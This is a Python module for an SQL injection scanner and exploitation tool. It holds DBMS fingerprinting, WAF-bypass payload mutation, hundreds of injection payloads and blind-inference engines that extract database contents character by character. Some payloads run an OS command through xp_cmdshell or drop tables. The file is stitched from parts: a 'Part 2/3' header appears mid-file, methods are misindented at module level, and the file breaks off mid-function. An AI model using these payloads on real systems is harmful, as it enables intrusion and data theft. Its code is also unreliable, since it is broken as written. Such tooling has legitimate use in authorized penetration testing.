"""SQL injection detection and exploitation module."""

import re
import time
import random
import hashlib
import base64
import statistics
import string
from urllib.parse import urlparse, parse_qs, urlencode, quote, unquote
from typing import Optional, Dict, List, Tuple, Any, Set
from collections import defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from enum import Enum
from core.vuln_types import VT
import itertools
import logging
import json

logger = logging.getLogger(__name__)

_GENERIC_SQL_ERROR_RE = re.compile(
    r'(SQLITE_ERROR|sqlite3\.OperationalError|SQLite\.Exception|System\.Data\.SQLite|'
    r'unrecognized token|no such column|no such table|near ".*?": syntax error|'
    r'PG::SyntaxError|PSQLException|unterminated quoted string|'
    r'ERROR:\s+syntax error at or near|ERROR:\s+column .* does not exist|'
    r'You have an error in your SQL syntax|check the manual that.*MySQL|'
    r'Warning.*mysql_.*|mysql_fetch|mysql_num_rows|'
    r'ORA-\d{4,5}|oracle\.jdbc\.driver|'
    r'Incorrect syntax near|Unclosed quotation mark|'
    r'Conversion failed when converting|Invalid column name|'
    r'SQL command not properly ended|quoted string not properly terminated|'
    r'SequelizeDatabaseError|Sequelize.*Error|knex.*error|'
    r'pg_query\(\)|pg_exec\(\)|mysqli_.*error|'
    r'DBD::.*DBI|DBI::.*error|ActiveRecord::.*Error)',
    re.IGNORECASE | re.DOTALL
)


class InjectionTechnique(Enum):
    ERROR_BASED = "error"
    UNION_BASED = "union"
    BOOLEAN_BLIND = "boolean"
    TIME_BLIND = "time"
    STACKED_QUERIES = "stacked"
    OUT_OF_BAND = "oob"
    SECOND_ORDER = "second_order"


class DBMS(Enum):
    MYSQL = "MySQL"
    POSTGRESQL = "PostgreSQL"
    MSSQL = "Microsoft SQL Server"
    ORACLE = "Oracle"
    SQLITE = "SQLite"
    MARIADB = "MariaDB"
    DB2 = "IBM DB2"
    INFORMIX = "Informix"
    SYBASE = "Sybase"
    ACCESS = "Microsoft Access"
    MONGODB = "MongoDB"
    CASSANDRA = "Cassandra"
    UNKNOWN = "Unknown"


@dataclass
class SQLiVulnerability:
    url: str
    parameter: str
    technique: InjectionTechnique
    dbms: DBMS
    payload: str
    confidence: float
    exploitable: bool
    metadata: Dict = field(default_factory=dict)
    injection_point: str = ""
    prefix: str = ""
    suffix: str = ""

    def to_dict(self) -> Dict:
        _SEVERITY = {
            InjectionTechnique.ERROR_BASED:    ("Critical", 9.8),
            InjectionTechnique.UNION_BASED:    ("Critical", 9.8),
            InjectionTechnique.BOOLEAN_BLIND:  ("High", 8.8),
            InjectionTechnique.TIME_BLIND:     ("High", 8.8),
            InjectionTechnique.STACKED_QUERIES:("High", 8.5),
            InjectionTechnique.OUT_OF_BAND:    ("High", 8.0),
            InjectionTechnique.SECOND_ORDER:   ("High", 8.2),
        }
        severity, cvss = _SEVERITY.get(self.technique, ("High", 7.5))
        return {
            "type":        f"SQL Injection ({self.technique.value})",
            "technique":   self.technique.value,
            "url":         self.url,
            "parameter":   self.parameter,
            "dbms":        self.dbms.value,
            "payload":     str(self.payload)[:200],
            "confidence":  self.confidence,
            "exploitable": self.exploitable,
            "severity":    severity,
            "cvss":        cvss,
            "metadata":    self.metadata,
            "category":    VT.SQL_INJECTION,
        }


class DBMSFingerprinter:
    """Advanced DBMS fingerprinting with pattern matching and behavioral analysis"""
    
    SIGNATURES = {
        DBMS.MYSQL: {
            'errors': [
                r'SQL syntax.*MySQL',
                r'Warning.*mysql_.*',
                r'MySQLSyntaxErrorException',
                r'valid MySQL result',
                r'check the manual that (corresponds to|fits) your (MySQL|MariaDB) server version',
                r'Unknown column .* in .field list.',
                r"Table.*doesn.t exist",
                r'You have an error in your SQL syntax',
                r'mysql_fetch',
                r'mysql_num_rows',
                r'mysql_query',
                r'supplied argument is not a valid MySQL',
                r'Column count doesn.t match value count at row',
                r'Operand should contain \d+ column',
                r'mysql_error\(\)',
                r'Warning.*mysqli.*',
            ],
            'version_regex': r'(?i)MySQL.*?([\d\.]+)',
            'concat': "CONCAT({},{})",
            'substring': "SUBSTRING({},{},{})",
            'length': "LENGTH({})",
            'ascii': "ASCII({})",
            'delay': "SLEEP({})",
            'comment': "-- ",
            'string_concat': "CONCAT(0x{},{})",
            'cast_to_int': "CAST({} AS SIGNED)",
            'database_enum': "SELECT schema_name FROM information_schema.schemata",
            'table_enum': "SELECT table_name FROM information_schema.tables WHERE table_schema='{}'",
            'column_enum': "SELECT column_name FROM information_schema.columns WHERE table_name='{}' AND table_schema='{}'",
            'current_user': "USER()",
            'current_db': "DATABASE()",
            'version': "VERSION()",
        },
        DBMS.POSTGRESQL: {
            'errors': [
                r'PostgreSQL.*ERROR',
                r'Warning.*\Wpg_.*',
                r'valid PostgreSQL result',
                r'Npgsql\.',
                r'PG::SyntaxError',
                r'org\.postgresql\.util\.PSQLException',
                r'ERROR:\s+syntax error at or near',
                r'ERROR:\s+column .* does not exist',
                r'ERROR:\s+relation .* does not exist',
                r'unterminated quoted string',
                r'ERROR:\s+invalid input syntax',
                r'pg_query\(\)',
            ],
            'version_regex': r'(?i)PostgreSQL.*?([\d\.]+)',
            'concat': "{}||{}",
            'substring': "SUBSTRING({},{},{})",
            'length': "LENGTH({})",
            'ascii': "ASCII({})",
            'delay': "pg_sleep({})",
            'comment': "-- ",
            'string_concat': "CHR({}) || {}",
            'cast_to_int': "CAST({} AS INTEGER)",
            'database_enum': "SELECT datname FROM pg_database",
            'table_enum': "SELECT tablename FROM pg_tables WHERE schemaname='public'",
            'column_enum': "SELECT column_name FROM information_schema.columns WHERE table_name='{}'",
            'current_user': "current_user",
            'current_db': "current_database()",
            'version': "version()",
        },
        DBMS.MSSQL: {
            'errors': [
                r'Driver.*SQL[\-\_\ ]*Server',
                r'OLE DB.*SQL Server',
                r'\[SQL Server\]',
                r'Microsoft SQL Native Client error',
                r'Unclosed quotation mark after the character string',
                r'System\.Data\.SqlClient\.SqlException',
                r'Incorrect syntax near',
                r'Invalid column name',
                r'Invalid object name',
                r'Conversion failed when converting',
                r'The multi-part identifier.*could not be bound',
            ],
            'version_regex': r'(?i)Microsoft SQL Server.*?([\d\.]+)',
            'concat': "{}+{}",
            'substring': "SUBSTRING({},{},{})",
            'length': "LEN({})",
            'ascii': "ASCII({})",
            'delay': "WAITFOR DELAY '0:0:{}'",
            'comment': "-- ",
            'string_concat': "CHAR({}) + {}",
            'cast_to_int': "CAST({} AS INT)",
            'database_enum': "SELECT name FROM master..sysdatabases",
            'table_enum': "SELECT name FROM {}.sys.tables",
            'column_enum': "SELECT name FROM {}.sys.columns WHERE object_id=OBJECT_ID('{}')",
            'current_user': "SYSTEM_USER",
            'current_db': "DB_NAME()",
            'version': "@@VERSION",
        },
        DBMS.ORACLE: {
            'errors': [
                r'\bORA-\d{5}',
                r'Oracle error',
                r'Oracle.*Driver',
                r'Warning.*\Woci_.*',
                r'Warning.*\Wora_.*',
                r'oracle\.jdbc\.driver',
                r'ORA-00933: SQL command not properly ended',
                r'ORA-01756: quoted string not properly terminated',
            ],
            'version_regex': r'(?i)Oracle.*?([\d\.]+)',
            'concat': "{}||{}",
            'substring': "SUBSTR({},{},{})",
            'length': "LENGTH({})",
            'ascii': "ASCII({})",
            'delay': "DBMS_LOCK.SLEEP({})",
            'comment': "-- ",
            'string_concat': "CHR({}) || {}",
            'cast_to_int': "TO_NUMBER({})",
            'database_enum': "SELECT DISTINCT owner FROM all_tables",
            'table_enum': "SELECT table_name FROM all_tables WHERE owner='{}'",
            'column_enum': "SELECT column_name FROM all_tab_columns WHERE table_name='{}'",
            'current_user': "USER",
            'current_db': "SYS_CONTEXT('USERENV','CURRENT_SCHEMA')",
            'version': "SELECT banner FROM v$version WHERE banner LIKE 'Oracle%'",
        },
        DBMS.SQLITE: {
            'errors': [
                r'SQLite/JDBCDriver',
                r'SQLite\.Exception',
                r'System\.Data\.SQLite\.SQLiteException',
                r'Warning.*sqlite_.*',
                r'sqlite3\.OperationalError',
                r'SQLITE_ERROR',
                r'no such column',
                r'no such table',
                r'unrecognized token',
            ],
            'version_regex': r'(?i)SQLite.*?([\d\.]+)',
            'concat': "{}||{}",
            'substring': "SUBSTR({},{},{})",
            'length': "LENGTH({})",
            'ascii': "UNICODE({})",
            'delay': None,
            'comment': "-- ",
            'string_concat': "CHAR({}) || {}",
            'cast_to_int': "CAST({} AS INTEGER)",
            'database_enum': "SELECT name FROM sqlite_master WHERE type='table'",
            'table_enum': "SELECT name FROM sqlite_master WHERE type='table'",
            'column_enum': "SELECT name FROM pragma_table_info('{}')",
            'current_user': None,
            'current_db': None,
            'version': "sqlite_version()",
        }
    }
    
    @classmethod
    def identify(cls, response_text: str, response_headers: Optional[Dict] = None) -> DBMS:
        """Identify DBMS from error messages and behavioral patterns"""
        text_lower = response_text.lower()
        
        scores = defaultdict(int)
        
        for dbms, config in cls.SIGNATURES.items():
            for pattern in config['errors']:
                matches = re.findall(pattern, response_text, re.IGNORECASE)
                if matches:
                    scores[dbms] += len(matches) * 10
            
            if dbms.value.lower() in text_lower:
                scores[dbms] += 5
            
            if 'version_regex' in config:
                version_match = re.search(config['version_regex'], response_text, re.IGNORECASE)
                if version_match:
                    scores[dbms] += 20
        
        if response_headers:
            server_header = response_headers.get('Server', '').lower()
            for dbms in DBMS:
                if dbms.value.lower() in server_header:
                    scores[dbms] += 3
        
        if scores:
            best_match = max(scores.items(), key=lambda x: x[1])
            if best_match[1] >= 10:
                return best_match[0]
        
        return DBMS.UNKNOWN
    
    @classmethod
    def get_config(cls, dbms: DBMS) -> Dict:
        """Get configuration for specific DBMS"""
        return cls.SIGNATURES.get(dbms, {})


class PayloadMutator:
    """Advanced payload mutation for WAF bypass"""
    
    ENCODING_METHODS = [
        'url_encode',
        'double_url_encode',
        'unicode_encode',
        'hex_encode',
        'base64_encode',
    ]
    
    OBFUSCATION_METHODS = [
        'comment_injection',
        'case_variation',
        'whitespace_substitution',
        'null_byte_injection',
        'scientific_notation',
    ]
    
    @staticmethod
    def url_encode(payload: str) -> str:
        return quote(payload)
    
    @staticmethod
    def double_url_encode(payload: str) -> str:
        return quote(quote(payload))
    
    @staticmethod
    def unicode_encode(payload: str) -> str:
        return ''.join(f'\\u{ord(c):04x}' if ord(c) > 127 else c for c in payload)
    
    @staticmethod
    def hex_encode(payload: str) -> str:
        return '0x' + ''.join(f'{ord(c):02x}' for c in payload)
    
    @staticmethod
    def base64_encode(payload: str) -> str:
        return base64.b64encode(payload.encode()).decode()
    
    @staticmethod
    def comment_injection(payload: str) -> List[str]:
        """Inject SQL comments to bypass filters"""
        variants = []
        
        comment_styles = ['/**/', '/**//**/', '/*!*/', '/*!12345*/', '--', '#']
        
        for comment in comment_styles:
            variants.append(payload.replace(' ', comment))
        
        words = payload.split()
        if len(words) > 1:
            for i in range(1, len(words)):
                mutated = ' '.join(words[:i]) + '/**/' + ' '.join(words[i:])
                variants.append(mutated)
        
        return variants
    
    @staticmethod
    def case_variation(payload: str) -> List[str]:
        """Generate case variations"""
        variants = []
        
        variants.append(payload.upper())
        variants.append(payload.lower())
        
        variants.append(''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)))
        
        variants.append(''.join(c.upper() if random.random() > 0.5 else c.lower() for c in payload))
        
        keywords = ['SELECT', 'UNION', 'WHERE', 'AND', 'OR', 'FROM', 'INSERT', 'UPDATE', 'DELETE']
        for keyword in keywords:
            if keyword in payload.upper():
                variants.append(payload.replace(keyword, ''.join(c.upper() if random.random() > 0.5 else c.lower() for c in keyword)))
        
        return variants
    
    @staticmethod
    def whitespace_substitution(payload: str) -> List[str]:
        """Replace whitespace with alternatives"""
        variants = []
        
        whitespace_alternatives = [
            '\t', '\n', '\r', '\v', '\f',
            '%09', '%0A', '%0D', '%0B', '%0C',
            '/**/', '+', '/**//**/'
        ]
        
        for ws in whitespace_alternatives:
            variants.append(payload.replace(' ', ws))
        
        return variants
    
    @staticmethod
    def null_byte_injection(payload: str) -> List[str]:
        """Inject null bytes"""
        return [
            payload + '%00',
            payload + '\x00',
            payload.replace(' ', '%00 '),
            payload.replace("'", "'%00"),
        ]
    
    @staticmethod
    def scientific_notation(payload: str) -> str:
        """Convert numbers to scientific notation"""
        return re.sub(r'\b(\d+)\b', lambda m: f"{m.group(1)}e0", payload)
    
    @classmethod
    def mutate(cls, payload: str, max_mutations: int = 50) -> List[str]:
        """Generate multiple mutations of a payload"""
        mutations = {payload}
        
        mutations.add(cls.url_encode(payload))
        mutations.add(cls.double_url_encode(payload))
        
        mutations.update(cls.comment_injection(payload))
        mutations.update(cls.case_variation(payload))
        mutations.update(cls.whitespace_substitution(payload))
        mutations.update(cls.null_byte_injection(payload))
        
        mutations.add(cls.scientific_notation(payload))
        
        combined = []
        for m1, m2 in itertools.combinations(list(mutations)[:20], 2):
            if len(combined) < 10:
                combined.append(m1[:len(m1)//2] + m2[len(m2)//2:])
        
        mutations.update(combined)
        
        return list(mutations)[:max_mutations]


class PayloadGenerator:
    """Professional payload generation for all injection techniques"""
    
    def __init__(self, dbms: DBMS = DBMS.UNKNOWN, mutator: Optional[PayloadMutator] = None):
        self.dbms = dbms
        self.mutator = mutator or PayloadMutator()
        self._cache = {}
        
    def error_based(self, max_payloads: int = 2000, enable_mutations: bool = True) -> List[str]:
        """Generate error-based payloads"""
        cache_key = f"error_{self.dbms.value}_{max_payloads}_{enable_mutations}"
        if cache_key in self._cache:
            return self._cache[cache_key]
        
        base_payloads = self._get_base_error_payloads()
        
        all_payloads = set(base_payloads)
        
        if enable_mutations:
            for payload in base_payloads[:100]:
                mutations = self.mutator.mutate(payload, max_mutations=20)
                all_payloads.update(mutations)
        
        if self.dbms != DBMS.UNKNOWN:
            dbms_specific = self._get_dbms_specific_error_payloads()
            all_payloads.update(dbms_specific)
        
        result = list(all_payloads)[:max_payloads]
        self._cache[cache_key] = result
        return result
    
    def _get_base_error_payloads(self) -> List[str]:
        """Base error-based payloads"""
        return [
            "'", "\"", "`", "''", '""', "```",
            "' OR '1", "' AND '1", "') OR ('1", "') AND ('1",
            "\" OR \"1", "\" AND \"1", "\") OR (\"1", "\") AND (\"1",
            "' OR 1=1--", "' OR 1=1#", "' OR 1=1/*",
            "' AND 1=1--", "' AND 1=2--",
            "admin'--", "admin' #", "admin'/*",
            "' UNION SELECT NULL--", "' UNION ALL SELECT NULL--",
            "1' ORDER BY 1--", "1' ORDER BY 100--",
            "' GROUP BY 1--", "' HAVING 1=1--",
            "' OR EXISTS(SELECT * FROM users)--",
            "' OR 1=1 LIMIT 1--",
            "' OR '1'='1' AND '1'='1",
            "1' UNION SELECT NULL,NULL,NULL--",
            "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            "' AND UPDATEXML(1,CONCAT(0x7e,VERSION()),1)--",
            "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT(SELECT CONCAT(CAST(DATABASE() AS CHAR),0x7e))))x FROM information_schema.tables GROUP BY x)a)--",
            "1 AND (SELECT * FROM (SELECT(SLEEP(0)))a)--",
            "' OR SLEEP(0)='",
            "1' AND MID(VERSION(),1,1) = '5",
            "' AND LENGTH(DATABASE())>0--",
            "' AND ASCII(SUBSTRING((SELECT @@version),1,1))>0--",
            "') AND ('1'='1",
            "\") AND (\"1\"=\"1",
            "') OR ('1'='1",
            "\") OR (\"1\"=\"1",
        ]
    
    def _get_dbms_specific_error_payloads(self) -> List[str]:
        """DBMS-specific error payloads"""
        payloads = []
        
        if self.dbms in (DBMS.MYSQL, DBMS.MARIADB):
            payloads.extend([
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version),0x7e))--",
                "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1)--",
                "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT table_name FROM information_schema.tables LIMIT 1),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y)--",
                "' UNION SELECT 1,2,3,4,5,CONCAT(0x7e,version(),0x7e,database(),0x7e)--",
                "' AND EXP(~(SELECT * FROM (SELECT USER())x))--",
                "' AND GTID_SUBSET(CONCAT(0x7e,(SELECT @@version)),1)--",
            ])
        
        elif self.dbms == DBMS.POSTGRESQL:
            payloads.extend([
                "' AND 1=CAST((SELECT version()) AS int)--",
                "'; SELECT CAST((SELECT version()) AS int)--",
                "' AND 1=CAST((SELECT current_database()) AS int)--",
                "'; CREATE TABLE test(data text); DROP TABLE test;--",
            ])
        
        elif self.dbms == DBMS.MSSQL:
            payloads.extend([
                "' AND 1=CONVERT(int,(SELECT @@version))--",
                "' AND 1=CONVERT(int,(SELECT DB_NAME()))--",
                "'; DECLARE @q varchar(8000) SELECT @q=0x73656c656374206e616d652066726f6d207379736f626a65637473 EXEC(@q)--",
                "' UNION SELECT NULL,NULL,@@version--",
            ])
        
        elif self.dbms == DBMS.ORACLE:
            payloads.extend([
                "' AND 1=CAST((SELECT banner FROM v$version WHERE banner LIKE 'Oracle%') AS int)--",
                "' UNION SELECT NULL,banner FROM v$version WHERE banner LIKE 'Oracle%'--",
            ])
        
        return payloads
    

"""
Advanced SQL Injection Module - Part 2/3
Boolean-blind, Time-based, and UNION exploitation engines
"""

def boolean_blind(self, max_pairs: int = 50) -> List[Tuple[str, str]]:
        """Generate boolean-based blind injection payload pairs"""
        cache_key = f"boolean_{self.dbms.value}_{max_pairs}"
        if cache_key in self._cache:
            return self._cache[cache_key]
        
        base_pairs = [
            ("' AND '1'='1", "' AND '1'='2"),
            ("' AND 1=1--", "' AND 1=2--"),
            ("' OR '1'='1", "' AND '1'='2"),
            ("') AND ('1'='1", "') AND ('1'='2"),
            ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
            ("' AND 'a'='a", "' AND 'a'='b"),
            ("1' AND '1'='1' AND '1'='1", "1' AND '1'='2' AND '1'='1"),
            ("' AND TRUE--", "' AND FALSE--"),
            ("1 AND 1=1", "1 AND 1=2"),
            ("1) AND (1=1", "1) AND (1=2"),
        ]
        
        if self.dbms in (DBMS.MYSQL, DBMS.MARIADB):
            base_pairs.extend([
                ("' AND SUBSTRING(VERSION(),1,1)='5", "' AND SUBSTRING(VERSION(),1,1)='9"),
                ("' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>0", "' AND ASCII(SUBSTRING((SELECT DATABASE()),1,1))>200"),
                ("' AND (SELECT COUNT(*) FROM information_schema.tables)>0", "' AND (SELECT COUNT(*) FROM information_schema.tables)>999999"),
                ("' AND LENGTH(DATABASE())>0", "' AND LENGTH(DATABASE())>999"),
                ("' AND MID(VERSION(),1,1)='5", "' AND MID(VERSION(),1,1)='9"),
                ("' AND ORD(MID(DATABASE(),1,1))>0", "' AND ORD(MID(DATABASE(),1,1))>200"),
            ])
        
        elif self.dbms == DBMS.POSTGRESQL:
            base_pairs.extend([
                ("' AND SUBSTRING(VERSION(),1,1)='P", "' AND SUBSTRING(VERSION(),1,1)='M"),
                ("' AND ASCII(SUBSTRING((SELECT current_database()),1,1))>0", "' AND ASCII(SUBSTRING((SELECT current_database()),1,1))>200"),
                ("' AND (SELECT COUNT(*) FROM pg_tables)>0", "' AND (SELECT COUNT(*) FROM pg_tables)>999999"),
                ("' AND LENGTH(current_database())>0", "' AND LENGTH(current_database())>999"),
            ])
        
        elif self.dbms == DBMS.MSSQL:
            base_pairs.extend([
                ("' AND SUBSTRING(@@VERSION,1,1)='M", "' AND SUBSTRING(@@VERSION,1,1)='X"),
                ("' AND ASCII(SUBSTRING((SELECT DB_NAME()),1,1))>0", "' AND ASCII(SUBSTRING((SELECT DB_NAME()),1,1))>200"),
                ("' AND LEN(DB_NAME())>0", "' AND LEN(DB_NAME())>999"),
            ])
        
        elif self.dbms == DBMS.ORACLE:
            base_pairs.extend([
                ("' AND SUBSTR(USER,1,1)='S", "' AND SUBSTR(USER,1,1)='Z"),
                ("' AND ASCII(SUBSTR(USER,1,1))>0", "' AND ASCII(SUBSTR(USER,1,1))>200"),
            ])
        
        result = base_pairs[:max_pairs]
        self._cache[cache_key] = result
        return result
    
def time_based(self, delay: int = 5, max_payloads: int = 100) -> Dict[DBMS, List[str]]:
        """Generate time-based blind injection payloads"""
        cache_key = f"time_{delay}_{max_payloads}"
        if cache_key in self._cache:
            return self._cache[cache_key]
        
        all_payloads = {
            DBMS.MYSQL: [
                f"' AND SLEEP({delay})--",
                f"' AND SLEEP({delay})#",
                f"' AND (SELECT {delay} FROM (SELECT(SLEEP({delay})))x)--",
                f"' OR SLEEP({delay})--",
                f"' XOR SLEEP({delay})--",
                f"1' AND SLEEP({delay}) AND '1'='1",
                f"1') AND SLEEP({delay}) AND ('1'='1",
                f"' AND IF(1=1,SLEEP({delay}),0)--",
                f"' AND BENCHMARK(5000000,MD5('A'))--",
                f"' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema!=DATABASE() AND SLEEP({delay}))--",
                f"' RLIKE SLEEP({delay})--",
                f"1' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--",
            ],
            DBMS.POSTGRESQL: [
                f"'; SELECT pg_sleep({delay})--",
                f"' AND 1=(SELECT 1 FROM pg_sleep({delay}))--",
                f"'; SELECT CASE WHEN (1=1) THEN pg_sleep({delay}) ELSE pg_sleep(0) END--",
                f"' AND (SELECT * FROM (SELECT pg_sleep({delay}))x)--",
                f"' || pg_sleep({delay})--",
                f"1'; SELECT pg_sleep({delay})--",
            ],
            DBMS.MSSQL: [
                f"'; WAITFOR DELAY '0:0:{delay}'--",
                f"' WAITFOR DELAY '0:0:{delay}'--",
                f"1'; WAITFOR DELAY '0:0:{delay}'--",
                f"' IF (1=1) WAITFOR DELAY '0:0:{delay}'--",
                f"'; IF (1=1) WAITFOR DELAY '0:0:{delay}' ELSE WAITFOR DELAY '0:0:0'--",
                f"1 WAITFOR DELAY '0:0:{delay}'--",
            ],
            DBMS.ORACLE: [
                f"' AND DBMS_LOCK.SLEEP({delay})--",
                f"' AND (SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)>0--",
                f"1' AND DBMS_LOCK.SLEEP({delay})--",
            ],
            DBMS.SQLITE: [
                f"' AND RANDOMBLOB(500000000)--",
                f"' AND (SELECT COUNT(*) FROM sqlite_master,sqlite_master AS T1,sqlite_master AS T2,sqlite_master AS T3)--",
            ]
        }
        
        for dbms in all_payloads:
            all_payloads[dbms] = all_payloads[dbms][:max_payloads]
        
        self._cache[cache_key] = all_payloads
        return all_payloads
    
def union_based(self, max_columns: int = 50) -> List[str]:
        """Generate UNION-based injection payloads"""
        cache_key = f"union_{max_columns}"
        if cache_key in self._cache:
            return self._cache[cache_key]
        
        payloads = []
        
        for cols in range(1, max_columns + 1):
            nulls = ','.join(['NULL'] * cols)
            
            payloads.extend([
                f"' UNION SELECT {nulls}--",
                f"' UNION ALL SELECT {nulls}--",
                f"') UNION SELECT {nulls}--",
                f"' UNION SELECT {nulls}#",
                f"' UNION/**/SELECT/**/{nulls}--",
                f"' /*!50000UNION*/ /*!50000SELECT*/ {nulls}--",
                f"' UnIoN SeLeCt {nulls}--",
                f"' UNION DISTINCT SELECT {nulls}--",
            ])
            
            if cols >= 2:
                for marker_pos in range(cols):
                    columns = ['NULL'] * cols
                    columns[marker_pos] = "'EREBUS_MARKER'"
                    payloads.append(f"' UNION SELECT {','.join(columns)}--")
        
        self._cache[cache_key] = payloads
        return payloads
    
def stacked_queries(self) -> List[str]:
        """Generate stacked query payloads"""
        base_payloads = [
            "'; SELECT SLEEP(0)--",
            "'; WAITFOR DELAY '0:0:0'--",
            "'; EXEC sp_MSforeachtable 'SELECT 0'--",
            "'; SELECT pg_sleep(0)--",
            "; SELECT 1--",
        ]
        
        if self.dbms == DBMS.MYSQL:
            base_payloads.extend([
                "'; SELECT 1--",
                "'; CREATE TEMPORARY TABLE test(id INT);--",
                "'; DROP TABLE IF EXISTS test;--",
                "'; UPDATE users SET username='admin' WHERE 1=0--",
            ])
        
        elif self.dbms == DBMS.MSSQL:
            base_payloads.extend([
                "'; DECLARE @test VARCHAR(8000); SET @test='test'--",
                "'; EXEC xp_cmdshell('whoami')--",
            ])
        
        elif self.dbms == DBMS.POSTGRESQL:
            base_payloads.extend([
                "'; CREATE TEMP TABLE test(id INT);--",
                "'; DROP TABLE IF EXISTS test;--",
            ])
        
        return base_payloads


class BooleanInferenceEngine:
    """Advanced boolean-based blind SQL injection exploitation"""
    
    def __init__(self, http_engine, url: str, param: str, true_payload: str, false_payload: str, dbms: DBMS = DBMS.UNKNOWN):
        self.http = http_engine
        self.url = url
        self.param = param
        self.true_payload = true_payload
        self.false_payload = false_payload
        self.dbms = dbms
        self.parsed = urlparse(url)
        self.params_dict = parse_qs(self.parsed.query)
        self.config = DBMSFingerprinter.get_config(dbms) if dbms != DBMS.UNKNOWN else {}
        
        self._true_response_cache = None
        self._false_response_cache = None
        self._baseline_length = None
        self._baseline_stdev = None
    
    def _get_baseline(self) -> int:
        """Get baseline response length and measure natural variance."""
        if self._baseline_length is not None:
            return self._baseline_length

        lengths = []
        for _ in range(5):
            resp = self.http.get(self.url)
            if resp:
                lengths.append(len(resp.text))

        if lengths:
            self._baseline_length = int(statistics.mean(lengths))
            self._baseline_stdev = statistics.stdev(lengths) if len(lengths) > 1 else 0.0
            return self._baseline_length

        return 0

    def _test_condition(self, condition: str) -> bool:
        """Test a boolean condition, using a threshold scaled to page variance."""
        payload = self.true_payload.replace("1=1", condition)

        test_params = self.params_dict.copy()
        test_params[self.param] = [self.params_dict[self.param][0] + payload]
        test_url = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{urlencode(test_params, doseq=True)}"

        resp = self.http.get(test_url)
        if not resp:
            return False

        baseline = self._get_baseline()
        threshold = max(50, (self._baseline_stdev or 0.0) * 3)

        return abs(len(resp.text) - baseline) < threshold
    
    def extract_string_binary(self, query: str, max_length: int = 100) -> str:
        """Extract string using binary search"""
        substring_func = self.config.get('substring', 'SUBSTRING')
        ascii_func = self.config.get('ascii', 'ASCII')
        
        result = ""
        
        for pos in range(1, max_length + 1):
            low, high = 32, 126
            
            while low <= high:
                mid = (low + high) // 2
                
                if self.dbms == DBMS.MYSQL:
                    char_expr = f"{ascii_func}({substring_func}(({query}),{pos},1))"
                elif self.dbms == DBMS.POSTGRESQL:
                    char_expr = f"{ascii_func}({substring_func}(({query}),{pos},1))"
                elif self.dbms == DBMS.MSSQL:
                    char_expr = f"{ascii_func}({substring_func}(({query}),{pos},1))"
                elif self.dbms == DBMS.ORACLE:
                    char_expr = f"{ascii_func}(SUBSTR(({query}),{pos},1))"
                else:
                    char_expr = f"ASCII(SUBSTRING(({query}),{pos},1))"
                
                condition = f"{char_expr}>{mid}"
                
                if self._test_condition(condition):
                    low = mid + 1
                else:
                    high = mid - 1
            
            if low < 32 or low > 126:
                break
            
            result += chr(low)
            logger.debug(f"Extracted: {result}")
        
        return result
    
    def extract_string_charset(self, query: str, charset: str = string.printable, max_length: int = 100) -> str:
        """Extract string by testing each character in charset"""
        substring_func = self.config.get('substring', 'SUBSTRING')
        
        result = ""
        
        for pos in range(1, max_length + 1):
            found = False
            
            for char in charset:
                if self.dbms == DBMS.MYSQL:
                    condition = f"{substring_func}(({query}),{pos},1)='{char}'"
                elif self.dbms == DBMS.POSTGRESQL:
                    condition = f"{substring_func}(({query}),{pos},1)='{char}'"
                elif self.dbms == DBMS.MSSQL:
                    condition = f"{substring_func}(({query}),{pos},1)='{char}'"
                else:
                    condition = f"SUBSTRING(({query}),{pos},1)='{char}'"
                
                if self._test_condition(condition):
                    result += char
                    found = True
                    logger.debug(f"Extracted: {result}")
                    break
            
            if not found:
                break
        
        return result
    
    def extract_number(self, query: str, max_value: int = 1000000) -> Optional[int]:
        """Extract numeric value using binary search"""
        low, high = 0, max_value
        
        while low <= high:
            mid = (low + high) // 2
            
            condition = f"({query})>{mid}"
            
            if self._test_condition(condition):
                low = mid + 1
            else:
                high = mid - 1
        
        return low
    
    def extract_length(self, query: str, max_length: int = 1000) -> int:
        """Extract length of a string"""
        length_func = self.config.get('length', 'LENGTH')
        
        length_query = f"{length_func}(({query}))"
        
        return self.extract_number(length_query, max_value=max_length)


class TimeInferenceEngine:
    """Advanced time-based blind SQL injection exploitation"""
    
    def __init__(self, http_engine, url: str, param: str, dbms: DBMS, delay: int = 5):
        self.http = http_engine
        self.url = url
        self.param = param
        self.dbms = dbms
        self.delay = delay
        self.parsed = urlparse(url)
        self.params_dict = parse_qs(self.parsed.query)
        self.config = DBMSFingerprinter.get_config(dbms)
        
        self._baseline_time = None
    
    def _get_baseline(self) -> float:
        """Get baseline response time"""
        if self._baseline_time is not None:
            return self._baseline_time
        
        times = []
        for _ in range(5):
            start = time.time()
            self.http.get(self.url)
            elapsed = time.time() - start
            times.append(elapsed)
        
        self._baseline_time = statistics.mean(times)
        return self._baseline_time
    
    def _build_delay_payload(self, condition: str) -> Optional[str]:
        """Build conditional time delay payload"""
        delay_func = self.config.get('delay')
        if not delay_func:
            return None
        
        if self.dbms in (DBMS.MYSQL, DBMS.MARIADB):
            return f"' AND IF({condition},{delay_func.format(self.delay)},0)--"
        
        elif self.dbms == DBMS.POSTGRESQL:
            return f"'; SELECT CASE WHEN ({condition}) THEN pg_sleep({self.delay}) ELSE pg_sleep(0) END--"
        
        elif self.dbms == DBMS.MSSQL:
            return f"'; IF ({condition}) WAITFOR DELAY '0:0:{self.delay}' ELSE WAITFOR DELAY '0:0:0'--"
        
        elif self.dbms == DBMS.ORACLE:
            return f"' AND (CASE WHEN ({condition}) THEN DBMS_LOCK.SLEEP({self.delay}) ELSE 0 END)=0--"
        
        return None
    
    def _test_condition(self, condition: str, samples: int = 3) -> bool:
        """Test if condition is true by measuring delay"""
